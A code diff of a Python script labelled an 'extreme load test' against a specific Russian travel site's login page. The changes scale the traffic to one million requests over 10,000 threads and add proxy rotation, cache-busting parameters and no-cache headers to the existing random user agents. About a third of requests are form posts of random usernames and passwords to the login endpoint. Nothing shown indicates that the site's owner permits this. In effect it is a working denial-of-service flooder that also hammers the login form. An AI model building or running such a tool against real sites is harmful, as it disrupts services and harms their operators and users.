@@ -6,13 +6,16 @@ from fake_useragent import UserAgent
 import json
 from collections import defaultdict
 import socket
+import sys
 
 # Конфигурация
 TARGET_URL = "https://travel-click.ru/login.page"
-REQUESTS_COUNT = 1500  # Увеличиваем нагрузку
-THREADS_COUNT = 150  # Больше потоков
-TEST_DURATION = 180  # 3 минуты
-REQUEST_TIMEOUT = (3.05, 15)  # Увеличили таймаут
+REQUESTS_COUNT = 1000000  # Увеличиваем в 5 раз
+THREADS_COUNT = 10000 # Увеличиваем количество потоков
+TEST_DURATION = 300  # 5 минут
+REQUEST_TIMEOUT = (5, 30)  # Увеличиваем таймауты
+USE_PROXIES = False  # Включить, если есть прокси
+PROXY_LIST = []  # Список прокси, если нужны
 
 # Инициализация
 ua = UserAgent()
@@ -25,11 +28,18 @@ def get_random_headers():
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
         'Referer': 'https://travel-click.ru/',
-        'Connection': 'keep-alive'
+        'Connection': 'keep-alive',
+        'Cache-Control': 'no-cache'
     }
 
 
-def enhanced_send_request(url, request_num):
+def get_proxy():
+    if USE_PROXIES and PROXY_LIST:
+        return random.choice(PROXY_LIST)
+    return None
+
+
+def simulate_complex_request(url, request_num):
     metrics = {
         'request_num': request_num,
         'status': None,
@@ -40,12 +50,11 @@ def enhanced_send_request(url, request_num):
         'response_size': 0,
         'redirects': 0,
         'dns_time': None,
-        'server_ip': None,
-        'response_headers': None
+        'server_ip': None
     }
 
     try:
-        # Измерение DNS и получение IP сервера
+        # Измерение DNS
         start_dns = time.time()
         hostname = url.split('/')[2]
         server_ip = socket.gethostbyname(hostname)
@@ -54,107 +63,142 @@ def enhanced_send_request(url, request_num):
             'server_ip': server_ip
         })
 
-        # Отправка запроса
+        # Параметры запроса
+        params = {
+            'headers': get_random_headers(),
+            'timeout': REQUEST_TIMEOUT,
+            'allow_redirects': True,
+            'verify': True
+        }
+
+        if USE_PROXIES:
+            proxy = get_proxy()
+            if proxy:
+                params['proxies'] = {
+                    'http': proxy,
+                    'https': proxy
+                }
+
+        # Чередуем GET и POST запросы
         start_time = time.time()
-        response = session.get(
-            url,
-            headers=get_random_headers(),
-            timeout=REQUEST_TIMEOUT,
-            allow_redirects=True
-        )
+        if random.random() > 0.7:  # 30% POST запросов
+            # Симуляция отправки формы
+            response = session.post(
+                url,
+                data={
+                    'username': f'testuser{random.randint(1, 10000)}',
+                    'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=12)),
+                    'remember': 'on'
+                },
+                **params
+            )
+        else:
+            # GET запрос с возможными параметрами
+            response = session.get(
+                url,
+                params={'cache_bust': random.randint(1, 100000)} if random.random() > 0.5 else None,
+                **params
+            )
 
         metrics.update({
             'status': response.status_code,
             'time': time.time() - start_time,
-            'success': True,
+            'success': response.status_code == 200,
             'response_size': len(response.content),
             'url': response.url,
-            'redirects': len(response.history),
-            'response_headers': dict(response.headers)
+            'redirects': len(response.history)
         })
 
+    except requests.exceptions.SSLError as e:
+        metrics['error_type'] = 'SSL Error'
+        metrics['error_details'] = str(e)
+    except requests.exceptions.ConnectionError as e:
+        metrics['error_type'] = 'Connection Error'
+        metrics['error_details'] = str(e)
+    except requests.exceptions.Timeout as e:
+        metrics['error_type'] = 'Timeout'
+        metrics['error_details'] = str(e)
     except Exception as e:
-        error_type = type(e).__name__
-        error_details = str(e) or "No details"
-
-        # Специальная обработка для None-ошибок
-        if error_details == "None":
-            error_details = "Empty error message"
-            error_type = "EmptyError"
-
-        metrics.update({
-            'error_type': error_type,
-            'error_details': error_details,
-            'time': time.time() - start_time if 'start_time' in locals() else None
-        })
+        metrics['error_type'] = type(e).__name__
+        metrics['error_details'] = str(e)
 
     return metrics
 
 
-def analyze_results(metrics):
-    successful = [m for m in metrics if m['success']]
-    failed = [m for m in metrics if not m['success']]
-
-    print("\n📊 ENHANCED TEST RESULTS:")
-    print(f"✅ Successful: {len(successful)}/{len(metrics)} ({len(successful) / len(metrics) * 100:.1f}%)")
-
-    if successful:
-        avg_time = sum(m['time'] for m in successful) / len(successful)
-        avg_dns = sum(m['dns_time'] for m in successful) / len(successful)
-        print(f"⏱ Avg response: {avg_time:.3f}s | DNS: {avg_dns:.3f}s")
-        print(f"🔗 Avg size: {sum(m['response_size'] for m in successful) / len(successful) / 1024:.2f} KB")
-
-    if failed:
-        print("\n🔍 FAILURE ANALYSIS:")
-        error_types = defaultdict(list)
-        for m in failed:
-            error_types[m['error_type']].append(m)
-
-        for error_type, errors in sorted(error_types.items(), key=lambda x: len(x[1]), reverse=True):
-            print(f"\n❌ {error_type}: {len(errors)} errors")
-
-            # Анализ первых 3 ошибок каждого типа
-            for error in errors[:3]:
-                details = error['error_details']
-                print(f"   - {details[:120]}" if details else "   - No details")
-
-                # Дополнительная информация для ConnectionError
-                if error_type == 'ConnectionError':
-                    print(f"     Request #{error['request_num']} | Time: {error['time']:.3f}s")
+def print_progress(current, total, start_time, errors):
+    elapsed = time.time() - start_time
+    req_per_sec = current / elapsed if elapsed > 0 else 0
+    sys.stdout.write(
+        f"\r🚀 Progress: {current}/{total} | "
+        f"Speed: {req_per_sec:.1f} req/sec | "
+        f"Errors: {errors} | "
+        f"Elapsed: {elapsed:.1f}s"
+    )
+    sys.stdout.flush()
 
 
 def run_load_test():
-    print(f"🔥 STARTING LOAD TEST: {TARGET_URL}")
+    print(f"🔥 EXTREME LOAD TEST STARTED: {TARGET_URL}")
     print(f"⚡ Configuration: {REQUESTS_COUNT} requests, {THREADS_COUNT} threads")
 
     metrics = []
     start_test_time = time.time()
+    error_count = 0
 
     with ThreadPoolExecutor(max_workers=THREADS_COUNT) as executor:
-        futures = [executor.submit(enhanced_send_request, TARGET_URL, i) for i in range(REQUESTS_COUNT)]
+        futures = [executor.submit(simulate_complex_request, TARGET_URL, i)
+                   for i in range(REQUESTS_COUNT)]
 
         for i, future in enumerate(as_completed(futures)):
-            metrics.append(future.result())
+            result = future.result()
+            metrics.append(result)
 
-            # Вывод прогресса
-            if i % 100 == 0 or i == REQUESTS_COUNT - 1:
-                elapsed = time.time() - start_test_time
-                error_count = len([m for m in metrics if not m['success']])
-                print(
-                    f"\r🚀 Progress: {i + 1}/{REQUESTS_COUNT} | "
-                    f"{len(metrics)/(elapsed or 1):.1f} req/sec | "
-                    f"Errors: {error_count}",
-                    end=''
-                )
+            if not result['success']:
+                error_count += 1
 
-    analyze_results(metrics)
+            # Вывод прогресса каждые 50 запросов или последний
+            if i % 50 == 0 or i == REQUESTS_COUNT - 1:
+                print_progress(i + 1, REQUESTS_COUNT, start_test_time, error_count)
+
+            # Прерывание по времени
+            if time.time() - start_test_time > TEST_DURATION:
+                print("\n⏰ Test duration reached, stopping...")
+                break
+
+    # Анализ результатов
+    analyze_results(metrics, start_test_time)
+
+
+def analyze_results(metrics, start_time):
+    successful = [m for m in metrics if m['success']]
+    failed = [m for m in metrics if not m['success']]
+
+    print("\n\n📊 FINAL RESULTS:")
+    print(f"✅ Successful requests: {len(successful)}/{len(metrics)} ({len(successful) / len(metrics) * 100:.1f}%)")
+    print(f"❌ Failed requests: {len(failed)}")
+    print(f"⏱ Total test time: {time.time() - start_time:.1f} seconds")
+
+    if successful:
+        avg_time = sum(m['time'] for m in successful) / len(successful)
+        print(f"\n⏱ Average response time: {avg_time:.3f}s")
+        print(f"🐢 Slowest response: {max(m['time'] for m in successful):.3f}s")
+        print(f"⚡ Fastest response: {min(m['time'] for m in successful):.3f}s")
+
+    if failed:
+        error_types = defaultdict(int)
+        for m in failed:
+            error_types[m['error_type']] += 1
+
+        print("\n🔍 Error analysis:")
+        for error, count in sorted(error_types.items(), key=lambda x: x[1], reverse=True):
+            print(f"  {error}: {count} errors")
 
     # Сохранение результатов
     timestamp = time.strftime("%Y%m%d_%H%M%S")
-    filename = f"travelclick_test_{timestamp}.json"
+    filename = f"extreme_test_{timestamp}.json"
     with open(filename, 'w') as f:
         json.dump(metrics, f, indent=2)
-    print(f"\n\n📄 Full results saved to {filename}")
+    print(f"\n📄 Full results saved to {filename}")
 
 
 if __name__ == "__main__":
